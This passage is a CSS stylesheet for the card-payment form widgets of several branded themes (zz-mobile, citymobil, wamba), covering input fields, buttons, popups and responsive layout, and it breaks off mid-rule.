.pay-card_type_zz-mobile,
.pay-card_type_zz-mobile .pay-card__card {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_zz-mobile .pay-card__card {
	margin: 0 auto 16px;
	padding: 0 16px;
	width: auto;
	max-width: 360px
}

.pay-card_type_zz-mobile .pay-card__row {
	padding-top: 0
}

.pay-card_type_zz-mobile .pay-card__card-selector {
	width: 100%;
	margin: 0 auto 24px;
	position: relative
}

.pay-card_type_zz-mobile .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_zz-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_zz-mobile .pay-card__select-card {
	width: 100%
}

.pay-card_type_zz-mobile .control__select {
	display: inline-block;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-family: Roboto, arial, helvetica;
	font-size: 17px;
	line-height: 56px;
	padding: 0 16px;
	color: #949599;
	border-color: rgba(34, 34, 34, .08);
	border-width: 1px 0;
	border-radius: 0;
	background: #fff;
	height: 56px;
	width: 100%
}

.pay-card_type_zz-mobile .pay-card__select-card .control-label {
	width: 100%;
	position: relative
}

.pay-card_type_zz-mobile .pay-card__card-selector:before {
	position: absolute;
	content: "";
	background: #fff;
	top: 50%;
	right: 23px;
	width: 9px;
	height: 9px;
	border: solid #949599;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg) translate(-50%, -50%);
	-o-transform: rotate(45deg) translate(-50%, -50%);
	transform: rotate(45deg) translate(-50%, -50%);
	pointer-events: none;
	z-index: 1
}

.pay-card_type_zz-mobile .pay-card__remove-card {
	color: $font_color_zz_light_green;
	position: absolute;
	top: 245px;
	z-index: 3;
	left: 50%;
	-webkit-transform: translateX(-128px);
	-o-transform: translateX(-128px);
	transform: translateX(-128px)
}

.pay-card_type_zz-mobile .credit-card-form__card-wrapper {
	position: relative;
	margin-bottom: 22px
}

.pay-card_type_zz-mobile .credit-card-form__form {
	padding: 0;
	text-align: left;
	position: relative
}

.pay-card_type_zz-mobile .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 100%;
	height: 204px;
	padding: 16px;
	background: #f6f6f6;
	border-radius: 4px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_zz-mobile .payment-systems-icons {
	top: 0;
	margin: 0 0 16px;
	float: left
}

.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_visa {
	top: 3px
}

.pay-card_type_zz-mobile .payment-systems-icon {
	float: right;
	margin: 0 16px 0 0
}

.pay-card_type_zz-mobile .payment-systems-icon.payment-systems-icon_name_mir_smaller,
.pay-card_type_zz-mobile .payment-systems-icon.payment-systems-icon_name_visa_smaller {
	top: 3px
}

.pay-card_type_zz-mobile .credit-card-form__label-group {
	clear: both
}

.pay-card_type_zz-mobile .credit-card-form__input {
	height: 40px;
	background: #fff;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	display: inline-block;
	margin: 0;
	color: #2e2e33;
	border: 0;
	padding-left: 10px;
	font-size: 14px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_zz-mobile .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_zz-mobile .credit-card-form__input:disabled {
	background: #fff;
	color: #e4e5e6;
	opacity: 1;
	-webkit-text-fill-color: #e4e5e6
}

.pay-card_type_zz-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #2e2e33
}

.pay-card_type_zz-mobile .credit-card-form__input::-moz-placeholder {
	color: #2e2e33
}

.pay-card_type_zz-mobile .credit-card-form__input::placeholder {
	color: #2e2e33
}

.pay-card_type_zz-mobile .credit-card-form__title {
	display: inline-block;
	width: 55px;
	margin: 0;
	padding-right: 8px;
	white-space: pre-wrap;
	text-transform: none;
	font-size: 15px;
	line-height: 20px;
	float: left;
	color: #949599
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_card-number {
	margin: 0 0 16px;
	padding: 0
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_card-number .credit-card-form__input {
	width: 193px;
	width: -webkit-calc(100% - 63px);
	width: calc(100% - 63px)
}

.pay-card_type_zz-mobile .credit-card-form__label_type_cvv {
	margin: 0 0 0 16px
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	width: 72px
}

.pay-card_type_zz-mobile .credit-card-form__label_type_cvv .credit-card-form__input {
	width: 50px
}

.pay-card_type_zz-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	padding-right: 0
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_add-card {
	position: absolute;
	top: 166px;
	left: 19px;
	z-index: 2
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 15px;
	line-height: 20px;
	color: #949599
}

.pay-card_type_zz-mobile .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_zz-mobile [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 16px;
	height: 16px;
	border: 2px solid #949599;
	border-radius: 4px
}

.pay-card_type_zz-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #2e2e33;
	border-color: #2e2e33
}

.pay-card_type_zz-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 12px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_zz-mobile .credit-card-form__terms {
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #949599;
	padding: 16px 0 0
}

.pay-card_type_zz-mobile .credit-card-form__terms-link {
	text-decoration: none;
	color: #8cc623
}

.pay-card_type_zz-mobile .credit-card-form__label .credit-card-form__error-text {
	display: none
}

.pay-card_type_zz-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f36
}

.pay-card_type_zz-mobile .credit-card-form__submit {
	margin-top: 0
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button,
.pay-card_type_zz-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	background: #ffa115;
	height: 40px;
	margin: 0;
	line-height: 40px;
	font-size: 17px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	width: 100%
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button:hover,
.pay-card_type_zz-mobile .credit-card-form__submit .button:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button:active,
.pay-card_type_zz-mobile .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card_type_zz-mobile .credit-card-form__submit .button__light {
	color: #fff;
	border-radius: 2px;
	background: #ffa115;
	text-transform: none
}

.pay-card_type_zz-mobile .credit-card-form__submit .button__light:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card_type_zz-mobile .credit-card-form__submit .button__light:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card_type_zz-mobile .credit-card-form__currency {
	font-size: 22px
}

.pay-card_type_zz-mobile .credit-card-form__amount {
	font-size: 31px;
	line-height: 32px;
	color: #2e2e33;
	text-align: center;
	margin-bottom: 14px
}

.pay-card_type_zz-mobile .notification-block .payment-info-table {
	width: 270px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1)
}

.pay-card_type_zz-mobile .notification-block .payment-info-table,
.pay-card_type_zz-mobile .notification-block .payment-info-table__caption {
	background: #fff;
	position: relative;
	display: block;
	padding: 20px 16px 0;
	margin-bottom: 30px
}

.pay-card_type_zz-mobile .notification-block .payment-info-table:before {
	position: absolute;
	left: -9px;
	top: -4px;
	z-index: 1;
	content: "";
	font-size: 0;
	line-height: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 288px;
	height: 8px;
	border-radius: 100px;
	background-color: #e4e5e6;
	-webkit-box-shadow: inset 0 1px 8px 0 #73737f;
	box-shadow: inset 0 1px 8px 0 #73737f;
	border: 2px solid rgba(46, 46, 51, .1)
}

.pay-card_type_zz-mobile .notification-block .payment-info-table__caption,
.pay-card_type_zz-mobile .notification-block .payment-info-table__cell,
.pay-card_type_zz-mobile .notification-block .payment-info-table__head {
	font-size: 15px;
	line-height: 20px;
	padding-bottom: 10px;
	vertical-align: top
}

.pay-card_type_zz-mobile .notification-block .payment-info-table__caption {
	position: relative;
	z-index: 2;
	display: block;
	margin: -20px -16px 12px;
	padding: 25px 16px 0;
	color: #2e2e33;
	text-align: left;
	background: #fff
}

.pay-card_type_zz-mobile .notification-block .payment-info-table__head {
	color: #949599;
	text-align: left;
	width: 98px;
	padding-left: 0
}

.pay-card_type_zz-mobile .notification-block .payment-info-table__cell {
	color: #2e2e33;
	padding-left: 0;
	padding-right: 0;
	width: 198px
}

.pay-card-layout_type_zz-mobile,
.pay-card-layout_type_zz-mobile .credit-card-form__popup {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, arial, helvetica;
	background-color: #fff
}

.pay-card-layout_type_zz-mobile .clearfix:after,
.pay-card-layout_type_zz-mobile .clearfix:before {
	display: block
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-message {
	color: #fff;
	font-size: 20px;
	line-height: 24px;
	vertical-align: top;
	letter-spacing: -.4px
}

.pay-card-layout_type_zz-mobile .pay-card__logo {
	padding: 16px 0;
	margin-right: 9px
}

.pay-card-layout_type_zz-mobile .zz-icon_name_logo-big {
	margin: 0 auto
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-body.credit-card-form__popup-body_type_result-error {
	height: auto;
	margin-bottom: 8px
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_result-error .notification-block__inner {
	padding: 40px 0 32px
}

.pay-card-layout_type_zz-mobile .notification-block_status_ok .title {
	padding-bottom: 55px
}

.pay-card-layout_type_zz-mobile .notification-block_status_ok .info-block .paragraph {
	font-size: 17px;
	font-weight: 600;
	line-height: 20px
}

.pay-card-layout_type_zz-mobile .notification-block_status_ok .button {
	width: auto
}

.pay-card-layout_type_zz-mobile .notification-block_status_ok .paragraph {
	position: relative
}

.pay-card-layout_type_zz-mobile .notification-block_status_ok .paragraph:after {
	position: absolute;
	left: 0;
	top: -24px;
	width: 100%;
	height: 0;
	border-bottom: 1px solid #f6f6f6;
	overflow: hidden;
	content: ""
}

.pay-card-layout_type_zz-mobile .info-block .info-block__content {
	padding: 16px
}

.pay-card-layout_type_zz-mobile .info-block .paragraph,
.pay-card-layout_type_zz-mobile .notification-block .title {
	line-height: 20px;
	color: #949599
}

.pay-card-layout_type_zz-mobile .notification-block .title {
	font-size: 17px;
	font-weight: 600
}

.pay-card-layout_type_zz-mobile .info-block .paragraph {
	font-size: 15px
}

.pay-card-layout_type_zz-mobile .info-block_type_error {
	display: none;
	background: #f36;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	position: relative
}

.pay-card-layout_type_zz-mobile .info-block_type_error .info-block__content:before {
	content: "";
	position: absolute;
	top: 50%;
	right: 16px;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%)
}

.pay-card-layout_type_zz-mobile .info-block_type_error .info-block__content {
	font-weight: 600;
	color: #fff;
	font-size: 13px;
	padding: 11px 40px 13px 16px;
	line-height: 16px;
	float: left
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button {
	display: block;
	margin: 0 auto;
	padding: 0 16px
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button__light {
	color: #fff;
	border-radius: 2px;
	background: #ffa115;
	background: #f6f6f6;
	color: #949599
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button__light:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button__light:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button__light:active,
.pay-card-layout_type_zz-mobile .credit-card-form__popup .button__light:hover {
	background: #f6f6f6;
	color: #000
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup .button:first-child {
	margin-bottom: 16px
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_loader .info-block__img-wrapper {
	top: -webkit-calc(50% - 37px);
	top: calc(50% - 37px);
	width: 88px;
	height: 88px;
	margin: auto;
	border-radius: 50%;
	background: #fff;
	position: relative
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img {
	-webkit-animation: spin-clockwise 1s linear infinite;
	-o-animation: spin-clockwise 1s linear infinite;
	animation: spin-clockwise 1s linear infinite;
	z-index: 2;
	content: "";
	position: absolute;
	top: 28px;
	left: 28px;
	right: 28px;
	margin: auto
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-footer {
	margin: 0 16px
}

.pay-card-layout_type_zz-mobile .info-block_type_session-countdown-timer {
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #949599;
	-webkit-box-shadow: inset 0 7px 4px -7px rgba(0, 0, 0, .1);
	box-shadow: inset 0 7px 4px -7px rgba(0, 0, 0, .1)
}

.secure-information_type_zz-mobile {
	text-align: center;
	padding: 16px 0;
	background: none;
	position: relative;
	border-top: 1px solid rgba(34, 34, 34, .08)
}

.secure-information_type_zz-mobile .secure-information__icon {
	margin-right: 10px
}

.secure-information_type_zz-mobile .secure-information__text {
	font-family: Roboto, arial, helvetica;
	display: block;
	font-size: 13px;
	line-height: 16px;
	color: #949599;
	margin-bottom: 10px
}

.secure-information_type_zz-mobile .protection-icons {
	margin-bottom: -5px
}

.secure-information_type_zz-mobile .protection-icons__list-item {
	margin-right: 10px
}

@media screen and (min-width:360px) {
	.pay-card_type_zz-mobile .pay-card__remove-card {
		-webkit-transform: translateX(-148px);
		-o-transform: translateX(-148px);
		transform: translateX(-148px)
	}
	.pay-card_type_zz-mobile .credit-card-form__input {
		padding-left: 16px;
		font-size: 15px
	}
	.pay-card_type_zz-mobile .credit-card-form__label_type_cvv {
		margin-left: 42px
	}
	.pay-card_type_zz-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
		width: 75px
	}
	.pay-card_type_zz-mobile .credit-card-form__label_type_cvv .credit-card-form__input {
		width: 61px
	}
	.pay-card_type_zz-mobile .credit-card-form__label-group_type_card-number .credit-card-form__input {
		width: 233px;
		width: -webkit-calc(100% - 63px);
		width: calc(100% - 63px)
	}
}

.pay-card-layout_type_zz-mobile .credit-card-form__currency {
	font-family: Roboto, Arial, sans-serif
}

.body_background_citymobil {
	height: 100%
}

.pay-card-layout_type_citymobil {
	position: relative;
	height: 100%;
	min-height: 260px
}

.pay-card_type_citymobil {
	position: static;
	width: 100%;
	margin: 0 auto 10px;
	padding: 5px 15px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_citymobil .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_citymobil .pay-card__card {
	width: auto
}

.pay-card_type_citymobil .pay-card__message {
	text-align: left
}

.pay-card_type_citymobil .credit-card-form__form {
	padding: 0
}

.pay-card_type_citymobil .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto 10px;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_citymobil .payment-systems-icons {
	position: absolute;
	left: 0;
	top: 21px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	height: 19px;
	z-index: 2
}

.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon {
	float: none;
	margin: 0
}

.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_citymobil .credit-card-form__label {
	position: relative;
	margin-bottom: 10px
}

.pay-card_type_citymobil .credit-card-form__title {
	position: absolute;
	top: 50%;
	-webkit-transform: translateY(-60%);
	-o-transform: translateY(-60%);
	transform: translateY(-60%);
	text-transform: none;
	font-size: 17px;
	color: #b3b4bc;
	pointer-events: none;
	margin: 0;
	padding: 0;
	text-align: left;
	letter-spacing: -.2px
}

.pay-card_type_citymobil .credit-card-form__input {
	background: #fff;
	border: none;
	border-bottom: 1px solid #dfe3e8;
	border-radius: 0;
	color: #212121;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	padding: 18px 0;
	vertical-align: middle
}

.pay-card_type_citymobil .credit-card-form__input::-webkit-input-placeholder {
	color: transparent;
	text-transform: none;
	font-size: 17px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_citymobil .credit-card-form__input::-moz-placeholder {
	color: transparent;
	text-transform: none;
	font-size: 17px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_citymobil .credit-card-form__input::placeholder {
	color: transparent;
	text-transform: none;
	font-size: 17px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_citymobil .credit-card-form__input.focused,
.pay-card_type_citymobil .credit-card-form__input:focus {
	border-bottom: 1px solid #f06537;
	-webkit-box-shadow: none;
	box-shadow: none;
	caret-color: #f06537;
	outline: none;
	-webkit-user-modify: read-write-plaintext-only;
	-webkit-tap-highlight-color: transparent
}

.pay-card_type_citymobil .credit-card-form__input.focused~.credit-card-form__title,
.pay-card_type_citymobil .credit-card-form__input:focus~.credit-card-form__title,
.pay-card_type_citymobil .credit-card-form__input~.credit-card-form__title.credit-card-form__title_type_position-top {
	top: -8px;
	font-size: 12px;
	-webkit-transform: translateY(0);
	-o-transform: translateY(0);
	transform: translateY(0);
	color: #b3b4bc
}

.pay-card_type_citymobil .credit-card-form__input:focus::-webkit-input-placeholder {
	color: #b3b4bc
}

.pay-card_type_citymobil .credit-card-form__input:focus::-moz-placeholder {
	color: #b3b4bc
}

.pay-card_type_citymobil .credit-card-form__input:focus::placeholder {
	color: #b3b4bc
}

.pay-card_type_citymobil .credit-card-form__label-group_type_card-number .credit-card-form__input,
.pay-card_type_citymobil .credit-card-form__label-group_type_card-number .credit-card-form__title {
	padding-left: 47px
}

.pay-card_type_citymobil .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_citymobil .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_citymobil .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_citymobil .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_citymobil .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_citymobil .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	margin: 0;
	padding: 0 0 0 6px;
	position: relative
}

.pay-card_type_citymobil .credit-card-form__cvv-icon,
.pay-card_type_citymobil .credit-card-form__tooltip-arrow,
.pay-card_type_citymobil .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_citymobil .credit-card-form__tooltip_type_cvv {
	background: none;
	outline: none;
	left: 0;
	top: 100%;
	-webkit-transform: translateY(8px);
	-o-transform: translateY(8px);
	transform: translateY(8px);
	padding: 0 0 0 6px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	letter-spacing: -.2px;
	color: #919eab;
	text-align: left;
	white-space: normal
}

.pay-card_type_citymobil .credit-card-form__error-text,
.pay-card_type_citymobil .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_citymobil .credit-card-form__error-text {
	background: none;
	outline: none;
	left: 0;
	bottom: -22px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	letter-spacing: -.2px;
	color: #bf0711;
	text-align: left;
	white-space: normal
}

.pay-card_type_citymobil .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block;
	white-space: nowrap;
	margin: 0;
	padding: 0;
	width: auto
}

.pay-card_type_citymobil .credit-card-form__label_type_cvv.credit-card-form__label_error_yes .credit-card-form__error-text {
	padding: 0 0 0 6px
}

.pay-card_type_citymobil .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_citymobil .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_citymobil .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	color: #bf0711
}

.pay-card_type_citymobil .credit-card-form__submit {
	margin: 0;
	width: 100%;
	position: absolute;
	bottom: 0;
	left: 0
}

.pay-card_type_citymobil .credit-card-form__submit-inner {
	margin: 0 auto;
	padding: 0 15px 10px
}

.pay-card-layout_type_citymobil .credit-card-form__popup .button,
.pay-card_type_citymobil .credit-card-form__submit .button {
	border-radius: 6px;
	width: 100%;
	height: 60px;
	margin: 0;
	line-height: 60px;
	font-size: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-weight: 400
}

.pay-card-layout_type_citymobil .credit-card-form__popup .button,
.pay-card-layout_type_citymobil .credit-card-form__popup .button:active,
.pay-card-layout_type_citymobil .credit-card-form__popup .button:hover,
.pay-card_type_citymobil .credit-card-form__submit .button,
.pay-card_type_citymobil .credit-card-form__submit .button:active,
.pay-card_type_citymobil .credit-card-form__submit .button:hover {
	color: #004ba9;
	background: #f4f6f8;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_citymobil .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_citymobil .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 6px
}

.pay-card-layout_type_citymobil .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_citymobil .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_citymobil .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_citymobil .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_citymobil .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_citymobil .credit-card-form__submit .button.button_disabled_yes:hover {
	color: #adc2e0;
	background: #f4f6f8;
	border-color: #f4f6f8;
	cursor: default;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_citymobil .credit-card-form__popup-footer {
	width: 100%;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-box-align: end;
	-webkit-align-items: flex-end;
	align-items: flex-end;
	margin: 0 auto;
	padding: 0 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_citymobil .credit-card-form__popup {
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	margin: 0 auto;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_citymobil .credit-card-form__popup .button {
	margin-bottom: 10px
}

.pay-card-layout_type_citymobil .credit-card-form__popup .info-block .title,
.pay-card-layout_type_citymobil .notification-block .title {
	margin: 40px 0 10px;
	font-size: 24px;
	color: #212121;
	font-weight: 700;
	letter-spacing: -.3px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card-layout_type_citymobil .credit-card-form__popup .info-block .paragraph,
.pay-card-layout_type_citymobil .info-block .paragraph {
	margin: 0;
	font-size: 17px;
	color: #b3b4bc;
	letter-spacing: -.4px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-weight: 300
}

.pay-card-layout_type_citymobil .credit-card-form__popup .info-block .paragraph_color_red {
	color: #b3b4bc
}

.pay-card-layout_type_wamba {
	position: relative;
	height: 100%;
	min-height: 260px
}

.pay-card_type_wamba {
	position: static;
	width: 100%
}

.pay-card-layout_type_wamba .credit-card-form__popup,
.pay-card_type_wamba {
	margin: 0 auto 10px;
	padding: 5px 10px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_wamba .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_wamba .pay-card__card {
	width: auto
}

.pay-card_type_wamba .pay-card__message {
	text-align: left
}

.pay-card_type_wamba .credit-card-form__form {
	padding: 0
}

.pay-card_type_wamba .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto 10px;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_wamba .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 21px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	height: 19px;
	z-index: 2
}

.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_wamba .payment-systems-icons .payment-systems-icon {
	float: none;
	margin: 0
}

.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_wamba .credit-card-form__label {
	position: relative
}

.pay-card_type_wamba .credit-card-form__title {
	display: none
}

.pay-card_type_wamba .pay-card__card-selector {
	margin: 0 0 23px;
	width: 100%
}

.pay-card_type_wamba .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_wamba.pay-card .control-label__text,
.pay-card_type_wamba .pay-card__remove-card-text {
	color: rgba(0, 0, 0, .4);
	text-transform: none;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_wamba .credit-card-form__input {
	background: rgba(113, 80, 80, 0);
	border: none;
